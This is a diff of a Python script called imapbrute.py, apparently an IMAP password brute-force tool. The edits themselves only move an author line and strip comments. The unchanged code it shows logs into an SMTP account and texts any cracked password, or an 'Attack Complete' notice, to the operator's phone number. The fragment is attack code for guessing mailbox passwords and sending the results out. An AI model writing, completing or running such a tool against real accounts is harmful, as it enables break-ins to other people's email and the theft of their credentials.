@@ -1,3 +1,5 @@
+'Author: Tyler Price'
+
 import imaplib
 import sys
 import threading
@@ -9,8 +11,6 @@ import os
 import smtplib
 import time
 import argparse
-
-'Author: Tyler Price'
 
 # Usage:  imapbrute.py [-h] [-eU EUSERNAME] [-eP EPASSWORD] [-eS SMTP] [-n NUMBER] [-u USERNAME] [-Is SERVER] [-f PATH]
 
@@ -48,13 +48,9 @@ server = smtplib.SMTP(SMTP, 587)
 server.ehlo()
 server.starttls()
 
-# Login for Gmail to send text. Place username without "@" sign
-
 server.login(eUsername, ePassword)
 
 def SucessMessage(username,password):
-
-	# Username with "@" sign
 
 	server.sendmail(eUsername, number, username)
 	server.sendmail(eUsername, number, '[!] Login Sucessful ' + password)
@@ -113,8 +109,6 @@ for x in filename:
 q.join()
 
 print colored("[!!!] Attack Complete...Password Not Found", "yellow")
-
-# Sending Results
 
 server.sendmail(eUsername, number, username)
 server.sendmail(eUsername, number, '[!!!] Attack Complete...Password Not Found')
